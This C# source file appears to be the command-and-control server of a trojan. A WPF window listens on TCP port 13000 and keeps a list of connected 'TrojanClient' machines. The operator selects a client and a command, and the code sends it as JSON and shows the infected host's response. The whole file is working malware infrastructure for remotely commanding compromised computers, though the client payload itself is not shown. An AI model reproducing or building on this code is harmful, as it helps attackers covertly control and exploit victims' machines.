using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Server.UI;
using Newtonsoft.Json;

namespace Server.TCP
{

    public class TcpServer
    {
        static Window1 serverGUI;

        private const Int32 PORT = 13000;

        public TcpListener tcpServer;

        private List<TrojanClient> trojanClients = new List<TrojanClient>();

        public TcpServer()
        {
            serverGUI = new Window1();
            serverGUI.Show();
            serverGUI.SentPressed += SendMessage;

            BackgroundWorker worker1 = new BackgroundWorker();
            worker1.DoWork += new DoWorkEventHandler(Worker1_DoWork);
            worker1.RunWorkerAsync();
        }

        private void Worker1_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, (ThreadStart)(async delegate ()
                {
                    tcpServer = new TcpListener(IPAddress.Any, PORT);
                    tcpServer.Start();
                    while (true)
                    {
                        var client = await tcpServer.AcceptTcpClientAsync();

                        int i = 0;

                        NetworkStream stream = client.GetStream();

                        var bytes = new Byte[256];
                        if (stream.CanRead)
                        {
                            i = await stream.ReadAsync(bytes, 0, bytes.Length);
                        }

                        var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        trojanClients.Add(new TrojanClient(client, clientName));
                        serverGUI.SetClients(trojanClients.Select(x => x.Name));
                        //ThreadPool.QueueUserWorkItem(ThreadProc, client);
                    }

                }));
            }
            catch (Exception ex)
            {
                serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, (ThreadStart)(delegate ()
                {
                    serverGUI.DisplayOutput(ex.Message + "\n");
                }));
            }
            finally
            {
                if (tcpServer != null)
                {
                    tcpServer.Stop();
                }
            }
        }
        

        async void SendMessage(object sender, EventArgs e)
        {
            int clientId = serverGUI.GetClientId();
            int commandId = serverGUI.GetCommandId();
            if (clientId >= 0 && commandId >= 0)
            {
                var trojanClient = trojanClients[serverGUI.GetClientId()];
                var client = trojanClient.Client;
                var bytes = new Byte[256];

                // Get a stream object for reading and writing

                NetworkStream stream = client.GetStream();
                byte[] msg = null;
                Command command = new Command(commandId, serverGUI.GetParameters());
                string output = JsonConvert.SerializeObject(command);
                msg = System.Text.Encoding.ASCII.GetBytes(output);
                try
                {

                    if (stream.CanWrite)
                    {
                        await stream.WriteAsync(msg, 0, msg.Length);
                    }
                    int i = 0;
                    if (stream.CanRead)
                    {
                        i = await stream.ReadAsync(bytes, 0, bytes.Length);
                    }
                    var response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                    serverGUI.DisplayOutput(response);
                }
                catch
                {
                    serverGUI.DisplayOutput("Client does not respond.");
                    RemoveClient(trojanClient);
                }
            }
            else
            {
                serverGUI.DisplayOutput("Select a client and a command.");
            }
        }

        private void RemoveClient(TrojanClient trojanClient)
        {
            trojanClients.Remove(trojanClient);
            serverGUI.SetClients(trojanClients.Select(x => x.Name));
        }

        private void RemoveClient(TcpClient client)
        {
            var trojanClient = trojanClients.Where(x => x.Client == client).FirstOrDefault();
            if (trojanClient != null)
                RemoveClient(trojanClient);
        }
    }
}
